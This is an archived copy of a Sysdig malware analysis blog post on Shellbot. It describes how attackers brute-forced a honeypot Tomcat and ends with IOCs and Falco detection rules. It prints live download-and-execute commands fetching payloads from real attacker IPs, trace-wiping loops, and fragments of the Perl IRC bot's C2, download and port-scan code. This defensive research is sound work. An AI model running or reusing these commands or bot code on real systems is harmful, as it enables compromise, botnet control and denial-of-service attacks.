{
    "id": "f0a0492c-92a6-41b7-8727-22a7e312f7b1",
    "created_at": "2023-01-12T15:00:19.663697Z",
    "updated_at": "2025-03-27T02:05:44.755836Z",
    "deleted_at": null,
    "sha1_hash": "3bbb070e620003694433c5a51eff34689b74c1ff",
    "title": "2021-11-02 - Malware analysis- Hands-On Shellbot malware",
    "authors": "",
    "file_creation_date": "2022-05-28T17:30:53Z",
    "file_modification_date": "2022-05-28T17:30:53Z",
    "file_size": 1538138,
    "plain_text": "# Malware analysis: Hands-On Shellbot malware\n\n**sysdig.com/blog/malware-analysis-shellbot-sysdig/**\n\nBy Alberto Pellitteri November 2, 2021\n\n**[Malware analysis is a fundamental factor in the improvement of the incident detection and](https://sysdig.com/blog/crypto-sysrv-hello-wordpress/)**\nresolution systems of any company. The Sysdig Security Research team is going to cover\nhow this Shellbot malware works and how to detect it.\n\n**Shellbot malware is still widespread. We recorded numerous incidents despite this being a**\nrelatively old and known attack that is also available on open Github repositories.\n\nWhen the malware is successfully deployed on a targeted system, it may be used for\ndifferent purposes according to the instructions received from its related IRC server, such\nas:\n\nDownloading several files to persistence.\nRunning a port scanning to discover the entire network.\nPerforming data exfiltration.\nParticipating in a distributed denial of service (DDoS).\n\n## What is Shellbot malware?\n\n**Shellbot malware enables the attackers to communicate with the C&C server in order to run**\ncommands within the victim machine. The C&C server, also called the IRC server in this\nscenario, is able to directly send some messages to its victims’ machines as a means to\nkeep the communication channel alive and to specify what commands they have to run.\n\n\n-----\n\nIts peculiarity is that the victim machine downloads and launches multiple binaries after\nthe first execution. Many of them have the same purpose but are conceived for different OS\n(32/64 bits) and CPUs (arm, mips).\n\nTo analyze the malware, we use our honeypot with misconfigured services to see real traces\nof different binaries. Let’s begin with a quick overview of Shellbot malware behavior:\n\n1. The entry point of this Shellbot malware was a misconfigured Tomcat application, with\n\ndefault credentials for its dashboard management.\n2. The first command downloaded `initd script that set the stage for the shellbot`\n\nmalware.\n3. Once executed, this first script:\n\n1. Downloaded several binaries and scripts.\n2. Erased the traces of the new downloads to prevent their detection.\n4. `Ulimit.sh script tried to increase the user process resource limits.`\n5. `Bash.sh script, instead, continuously loops to check among the sockets for some`\n\nspecific process ID (PID) to be killed.\n6. Finally, some other binaries were downloaded as Perl scripts or ELF files, conceived to\n\nmake the malware runnable over different platforms. These are the real Shellbot\nmalware that forces the victim to communicate with the IRC server, executing and\nrunning whatever it wants.\n\nIn our malware analysis, we experienced that the victim container was exploited for the\npurpose of causing a DoS to some remote domains, flooding it with thousands of packets.\n\n\n-----\n\nLet s dig deeper into the details of this Shellbot malware to see how it exactly works, and\n[understand the malicious behavior to learn how to detect it with open source Falco.](http://falco.org/)\n\n## Shellbot malware in depth\n\n### #1 Initial Access – Hacked Tomcat and the initd script\n\nThe attacker gained access to the Tomcat container, [brute forcing its default credentials and](https://attack.mitre.org/techniques/T1110/)\n[spawning a reverse shell. It ran the following command in order to download the first bash](https://sysdig.com/blog/reverse-shell-falco-sysdig-secure/)\nscript:\n\nThis script first [removed the traces in case it has already existed in the container, and then it](https://attack.mitre.org/techniques/T1070/004/)\ndownloaded these other files to be executed:\n```\ncd /tmp; wget http://192.99.43.212/54545asd5asd45as45/mizakotropistax64; curl -O\nhttp://192.99.43.212/54545asd5asd45as45/mizakotropistax64; cat mizakotropistax64\n>x0000x;chmod +x *;nice -20 ./x0000x dedicated\ncd /tmp; wget http://192.99.43.212/craton.pl -O /tmp/craton.pl; curl\nhttp://192.99.43.212/craton.pl -o /tmp/craton.pl; chmod 777 /tmp/craton.pl; perl\n/tmp/craton.pl; rm -rf /tmp/craton.pl; rm -rf /tmp/craton.pl.*\ncd /tmp; wget http://192.99.43.212/bash.sh; curl http://192.99.43.212/bash.sh -o\nbash.sh; chmod 777 bash.sh; nohup bash bash.sh &\ncd /tmp; wget http://192.99.43.212/ulimit.sh; curl http://192.99.43.212/ulimit.sh -o\nulimit.sh; chmod 777 ulimit.sh; bash ulimit.sh; rm -rf ulimit.sh\ncd /tmp; wget http://144.217.249.55/bot.pl -O /tmp/bot.pl --quiet; curl -s\nhttp://144.217.249.55/bot.pl -o /tmp/bot.pl; perl /tmp/bot.pl; rm -rf /tmp/bot.pl; rm\n-rf /tmp/bot.pl.1\nmkdir /tmp/.logs/\ncd /tmp; wget http://144.217.249.55/apachelogd -O /tmp/.logs/apachelogd; curl\nhttp://144.217.249.55/apachelogd -o /tmp/.logs/apachelogd; chmod +x\n/tmp/.logs/apachelogd; rm -rf /tmp/.logs/apachelogd.*\n\n```\nIt modified the shell configuration file so that it will download the files again when the user\nopens a new terminal.\n\nIn the end, the malware removed all files, the history, and whatever it had fetched from\nthe IRC server.\n\n\n-----\n\n```\n...\nrm -rf /var/tmp/bot.pl\nrm -rf /tmp/bot.pl\nrm -rf bot.pl\nrm -rf bot.pl.1\nrm -rf /tmp/bot.pl.1\nrm -rf /var/tmp/bot.pl.1\nrm -rf /var/tmp/meca.pl\nrm -rf /var/tmp/meca2.pl\nrm -rf /tmp/meca2.pl\nrm -rf /tmp/meca.pl\nrm -rf /tmp/mizakotropista*\nrm -rf /tmp/x0000x*\nrm -rf /tmp/*.sh\nrm -rf /tmp/*.pl.*\n...\n\n### #2 Malware capabilities limitless – ulimit.sh script\n\n```\nThis `ulimit.sh script initially checked the` `$EUID variable as a way to see if the attacker`\nhad root permissions. If so, it ran the `ulimit command that allowed setting resource limits,`\nlike the maximum number of user processes ( -u ), maximum scheduling priority ( -e ), and\nso on.\n```\n...\nulimit -u unlimited\nulimit -s unlimited\nulimit -q unlimited\nulimit -n 999999\nulimit -l unlimited\nulimit -i unlimited\nulimit -c unlimited\nulimit -e unlimited\nulimit -r unlimited\n...\n\n### #3 Stealth malware activities – bash.sh script\nbash.sh script looped endlessly to remove any evidence that this attack had existed, and\ninitd script did so too.\n\n```\nIn fact, it printed out all sockets with their process name and process ID, searching for some\nspecific ones to be killed with the `kill -9 command.`\n\nThen, it removed some evidence, slept one second, and looped again.\n\n\n-----\n\n```\nwhile true\nDo\nnetstat -anp | grep '666' | awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill\n-9\nnetstat -anp | grep '107.172' | awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs\nkill -9\nrm -rf /tmp/*.arm\nrm -rf /tmp/*.arm5n\nrm -rf /tmp/*.arm7\nrm -rf /tmp/*.m68k\nrm -rf /tmp/*.mips\nrm -rf /tmp/*.mpsl\nrm -rf /tmp/*.ppc\nrm -rf /tmp/*.sh4\n...\n\n### #4 The Shellbot core: bot.pl and craton.pl\n\n```\nTo run the malware analysis on our pod, the `initd script had initially downloaded binaries,`\nlike mizakotropistax86 and some Perl scripts. By the way, the real purpose of these binaries\nis the same, so we are going to give a look at the Perl ones.\n```\nBot.pl and craton.pl are two identical scripts used to communicate with different IRC\n\n```\n[servers, via different ports. This Perl script is also available on Github and could be modified](https://github.com/nikicat/web-malware-collection/blob/master/Bots/Perl/shellbot.pl)\nby the attackers to customize the malware behavior and what the IRC server wants to do, as\nwell as bypass typical blacklist methods to detect malware.\n\nLet’s give a look at this script.\n\n**Static code analysis for the Perl scripts**\n\nInitially, the IRC server IP and its port are defined:\n```\nmy $servidor='192.99.43.212' unless $servidor;\nmy $porta='2894';\nmy @canais=(\"#spoof\");\nmy @adms=(\"r00x\");\n\n```\nThe script also specified how to handle some signals, adding a reference to the signal key\nvalue. In this case, using the `'IGNORE' value, the process can be able to ignore the`\nfollowing signals:\n```\n$SIG{'INT'} = 'IGNORE';\n$SIG{'HUP'} = 'IGNORE';\n$SIG{'TERM'} = 'IGNORE';\n$SIG{'CHLD'} = 'IGNORE';\n$SIG{'PS'} = 'IGNORE';\n\n```\nMoreover, the script initially declared the usage of the `IO::Socket interface, which`\nprovides an object-oriented way to create and handle sockets. With this interface, it sets the\nsocket first and runs the can read() method in order to receive an array of handles ready\n\n\n-----\n\nfor reading.\n```\n…\nmy @ready = $sel_cliente->can_read(0.6);\nnext unless(@ready);\nforeach $fh (@ready) {\n     $IRC_cur_socket = $fh;\n     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n     $nread = sysread($fh, $msg, 4096);\n     if ($nread == 0) {\n          $sel_cliente->remove($fh);\n          $fh->close;\n          delete($irc_servers{$fh});\n     }\n     @lines = split (/n/, $msg);\n     for(my $c=0; $c<= $#lines; $c++) {\n          $line = $lines[$c];\n          $line=$line_temp.$line if ($line_temp);\n          $line_temp='';\n          $line =~ s/r$//;\n          unless ($c == $#lines) {\n              parse(\"$line\");\n          } else {\n              if ($#lines == 0) {\n                   parse(\"$line\");\n              } elsif ($lines[$c] =~ /r$/) {\n                   parse(\"$line\");\n               } elsif ($line =~ /^(S+) NOTICE AUTH :***/) {\n                   parse(\"$line\");\n              } else {\n                   $line_temp = $line;\n              }\n          }\n     }\n}\n...\n\n```\nFor each handle obtained, the script reads `4096 bytes from the socket, stores them into`\n```\n$msg variable, and splits each message by the newline character into many lines.\n\n```\nOnce these lines have been separated, the script calls `parse() subroutine on each one to`\nmatch specific regular expressions that will force the bot, and also the victim system, to do\nwhatever the IRC server wants.\n\nHere are some patterns that can be parsed inside each line received from the IRC server,\nand that encode a specific execution to be run from the target system.\n\nHere is the PING-PONG exchange that is used to keep the communication channel\nalive between the bot and the IRC server. It also follows an example of how this\n[exchange appears, analyzing the capture with Sysdig Inspect.](https://github.com/draios/sysdig-inspect)\n\n\n-----\n\n```\nif ($servarg  / PING :(. )/) {\n     sendraw(\"PONG :$1\");\n}\n\n```\nThe IRC server can also request to download some specific resources within the victim\nmachine. In this case, the machine calls another function to fetch that specific\nresource, storing it into the file system.\n```\nelsif ($funcarg =~ /^download\\s+(.*)\\s+(.*)/) {\n     getstore(\"$1\", \"$2\");\n     sendraw($IRC_cur_socket, \"PRIVMSG $printl :Download de $2 ($1) Concluido!\")\nif($estatisticas);\n}\n\n```\nIt can also ask to perform a [port scanning, which has the purpose to contact some](https://attack.mitre.org/techniques/T1046/)\nspecific ports of the target IP or a full-port scanning. The information collected about\nthe open ports will be sent back to the IRC server.\n```\nif ($funcarg =~ /^portscan (.*)/) {\n     my $hostip=\"$1\";\n     my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\");\n     my (@aberta, %porta_banner);\n     foreach my $porta (@portas) {\n          my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort =>\n$porta, Proto => 'tcp', Timeout => 4);\n          if ($scansock) {\n              push (@aberta, $porta);\n              $scansock->close;\n          }\n     }\n     if (@aberta) {\n          sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @aberta\");\n     } else {\n          sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi\nencontrada.\");\n     }\n}\n\n```\n\n-----\n\n```\nelsif ($funcarg  / fullportscan\\s+(. )\\s+(\\d+)\\s+(\\d+)/) {\n     my $hostname=\"$1\";\n     my $portainicial = \"$2\";\n     my $portafinal = \"$3\";\n     my (@abertas, %porta_banner);\n     foreach my $porta ($portainicial..$portafinal) {\n          my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort\n=> $porta, Proto => 'tcp', Timeout => 4);\n          if ($scansock) {\n              push (@abertas, $porta);\n              $scansock->close;\n              if ($estatisticas) {\n                   sendraw($IRC_cur_socket, \"PRIVMSG $printl :Porta\n$porta aberta em $hostname\");\n              }\n          }\n     }\n     if (@abertas) {\n          sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas:\n@abertas\");\n     } else {\n          sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi\nencontrada.\");\n     }\n}\n\n```\n[The two sides can also send “private messages” in order to perform data exfiltration,](https://attack.mitre.org/techniques/T1041/)\nexchange other information, or run more specific commands.\n\n### #5 The flooding binary: apachelogd\n\nThis binary was downloaded at the beginning of the Shellbot infection from the `initd bash`\nscript that we mentioned before.\n\nIt’s quite interesting that the binary remains stealthy until a remote command is received by\nthe IRC server.\n\nAs a matter of fact, several hours after receiving the attack, we noticed this command\nexecution:\n\nAfter that, our container started [flooding the domain specified in the command line, always](https://attack.mitre.org/techniques/T1499/)\ntargeting the same recipient port but continuously changing the client port.\n\n\n-----\n\n## Summary of IOC and suspicious activities detected\n\n**IPs & URLs**\n\n192.99.43.212\n144.217.249.55\n141.95.19.123\nhttps://cadastramentoltau.com/\n\n**Files and their SHA256:**\n\n```\nInitd\n\n```\n\n718db42305a8d5b4c3ff74a05037de2f5e679db24bf86b8e88ab34c490699ea3\n\n```\nBash.sh\n\n```\n\na5e010b0abf603facae5676c2c37f7063f6efc12bc7c863982bff133ec547a3f\n\n```\nUlimit.sh\n\n```\n\ndb5382c0ef1b204672b4168425d737380288653ac74360b39f1ec466a5a47eb9\n\n```\nBot.pl\n\n```\n\nd4bbe4087175d3981b2925b77c24baffd8e086c2f9df7179d142e00e7e2ec3ce\n\n```\nCraton.pl\n\n```\n\n7046260a23088b52debdeb701032db0352323ed26d9816daa4a53222b26ca720\n\n```\nMizakotropistax86\n\n```\n\n5d6f674a7abab5e60548531a69e6ecb23cc2e2fe823cd7f8ccac6928db5f757e\n\n```\nApachelogd\n\n```\n\n387099a6c011c0074b9a368a7d3818e3daab0b24527b65d589b583772f5e1c56\n\n**Suspicious behavior**\n\n\n-----\n\nA few suspicious activities worth mentioning in our malware analysis:\n\n`wget` or curl commands inside a container at runtime (not build time).\nWriting below `/tmp folder and giving the execution permissions at run time to new`\nfiles may be a sign of future malware execution.\nFile removal and history deletion can represent that something wants to hide its tracks.\nNetwork communication with the IRC server and anomaly outbound traffic over the\ninternet.\n\nOnce we have identified these activities, we see how we can perform their detection.\n\n## Detecting malware execution with Falco\n\n[The detection of this Shellbot malware and other generic ones can be done using Falco in](https://falco.org/)\norder to spot suspicious connections or malicious binary downloads and executions.\n\nFalco is the [CNCF open-source project, used to detect unexpected application behavior and](https://www.cncf.io/projects/)\nsend alerts at runtime.\n\nYou can leverage its powerful and flexible rules language to match suspicious behaviors,\ngenerating event alerts. It comes with a predefined set of rules, but you can also customize\nthem or create new ones that fit your needs as you want.\n\nHere, you can see some useful custom rules.\n\n\n-----\n\n```\n rule: Unexpected outbound connection destination\n desc: Detect any outbound connection to a destination outside of an allowed set of\nips, networks, or domain names\n condition: >\n  consider_all_outbound_conns and outbound and not\n  ((fd.sip in (allowed_outbound_destination_ipaddrs)) or\n   (fd.snet in (allowed_outbound_destination_networks)) or\n   (fd.sip.name in (allowed_outbound_destination_domains)))\n output: Disallowed outbound connection destination (command=%proc.cmdline\nconnection=%fd.name user=%user.name user_loginuid=%user.loginuid\ncontainer_id=%container.id image=%container.image.repository)\n priority: NOTICE\n tags: [network]\n- rule: Modify Shell Configuration File\n desc: Detect attempt to modify shell configuration files\n condition: >\n  open_write and\n  (fd.filename in (shell_config_filenames) or\n   fd.name in (shell_config_files) or\n   fd.directory in (shell_config_directories))\n  and not proc.name in (shell_binaries)\n  and not exe_running_docker_save\n output: >\n  a shell configuration file has been modified (user=%user.name\nuser_loginuid=%user.loginuid command=%proc.cmdline pcmdline=%proc.pcmdline\nfile=%fd.name container_id=%container.id image=%container.image.repository)\n priority:\n  WARNING\n tags: [file, mitre_persistence]\n- rule: Interpreted procs outbound network activity\n desc: Any outbound network activity performed by any interpreted program (perl,\npython, ruby, etc.)\n condition: >\n  (outbound and consider_interpreted_outbound\n   and interpreted_procs)\n output: >\n  Interpreted program performed outgoing network connection\n  (user=%user.name user_loginuid=%user.loginuid command=%proc.cmdline\nconnection=%fd.name container_id=%container.id image=%container.image.repository)\n priority: NOTICE\n tags: [network, mitre_exfiltration]\n- rule: Container Drift Detected (chmod)\n desc: New executable created in a container due to chmod\n condition: >\n  chmod and\n  consider_all_chmods and\n  container and\n  not runc_writing_var_lib_docker and\n  not user_known_container_drift_activities and\n  evt.rawres>=0 and\n  ((evt.arg.mode contains \"S_IXUSR\") or\n  (evt.arg.mode contains \"S_IXGRP\") or\n\n```\n\n-----\n\n```\n  (evt.arg.mode contains S_IXOTH ))\n exceptions:\n  - name: proc_name_image_suffix\n   fields: [proc.name, container.image.repository]\n   comps: [in, endswith]\n  - name: cmdline_file\n   fields: [proc.cmdline, fd.name]\n   comps: [in, in]\n   values:\n    - [[\"runc:[1:CHILD] init\"], [/exec.fifo]]\n output: Drift detected (chmod), new executable created in a container\n(user=%user.name user_loginuid=%user.loginuid command=%proc.cmdline\nfilename=%evt.arg.filename name=%evt.arg.name mode=%evt.arg.mode event=%evt.type)\n priority: ERROR\n- rule: Outbound Connection to C2 Servers\n desc: Detect outbound connection to command & control servers\n condition: outbound and fd.sip in (c2_server_ip_list)\n exceptions:\n  - name: proc_proto_sport\n   fields: [proc.name, fd.l4proto, fd.sport]\n output: Outbound connection to C2 server (command=%proc.cmdline connection=%fd.name\nuser=%user.name user_loginuid=%user.loginuid container_id=%container.id\nimage=%container.image.repository)\n priority: WARNING\n tags: [network]\n\n```\nYou can check the [full rule descriptions on GitHub.](https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml#L2840)\n\nThese Falco rules can detect suspicious outbound and inbound traffic, with or without\ninterpreted programs, like perl. They can also spot other common behaviors that this\nShellbot malware adopts, like giving execution permission to the downloaded files or\nmodifying the shell configuration file.\n\n## Detecting with Sysdig Secure\n\nThe [Sysdig Secure DevOps Platform is built on top of Falco and can also be used to detect](https://sysdig.com/platform-architecture/)\nthis attack. For example, DevOps can:\n\nCreate a policy to detect any destination IPs or ports which are not in the white list.\nCreate a policy to detect any binaries and scripts launched which are not in the allow\nlist (e.g., `craton.pl,bot.pl,` `etc .).`\nCreate a policy to detect any execution by interpreted programs, like Perl, if it is not\nexpected.\n\n\n-----\n\nThe `c2_server_ip_list can be filled with the malicious IP that we found.`\n\nMoreover, you can also prevent any of these behaviors, killing and restarting the involved\nsystems when your Falco rules are triggered\n\n\n-----\n\n## Conclusion\n\nThe Sysdig Security Research team dug deep into Shellbot malware architecture and\nmalicious activity to improve the detection systems.\n\nWe covered a counter-trend malware that can compromise your system, giving the attacker\nthe possibility to download new files, open connections, leverage your machine to launch\nDDoS attacks to a specific target, and so on.\n\nSo, the system administrator must always adopt tools in order to detect suspicious behaviors\nand anomalous connections. Thus, they can protect the integrity of their environment, and\nkeep all the services and software up to date to avoid becoming a zombie system.\n\nIf you would like to find out more about Falco:\n\nGet started at [Falco.org.](http://falco.org/)\n[Check out the Falco project on GitHub.](https://github.com/falcosecurity/falco)\n[Get involved with the Falco community.](https://falco.org/community/)\n[Meet the maintainers on the Falco Slack.](https://kubernetes.slack.com/?redir=%2Farchives%2FCMWH3EH32)\nFollow [@falco_org on Twitter.](https://twitter.com/falco_org)\n\n_At_ _[Sysdig Secure, we extend Falco with out-of-the-box rules, along with other open source](https://sysdig.com/products/secure/)_\n_projects, making it even easier to work with and manage Kubernetes security._ _Register for_\n_our Free 30-day trial and see for yourself!_\n\n_The_ _[Sysdig Secure DevOps Platform provides security to confidently run containers,](https://sysdig.com/platform-architecture/)_\n_Kubernetes, and cloud services. With Sysdig, you can secure the build pipeline, detect and_\n_respond to runtime threats, continuously validate compliance, and monitor and troubleshoot_\n_[cloud infrastructure and services. Try it today!](https://sysdig.com/company/free-trial/)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-02 - Malware analysis- Hands-On Shellbot malware.pdf"
    ],
    "report_names": [
        "2021-11-02 - Malware analysis- Hands-On Shellbot malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535619,
    "ts_updated_at": 1743041144,
    "ts_creation_date": 1653759053,
    "ts_modification_date": 1653759053,
    "files": {
        "pdf": "https://archive.orkl.eu/3bbb070e620003694433c5a51eff34689b74c1ff.pdf",
        "text": "https://archive.orkl.eu/3bbb070e620003694433c5a51eff34689b74c1ff.txt",
        "img": "https://archive.orkl.eu/3bbb070e620003694433c5a51eff34689b74c1ff.jpg"
    }
}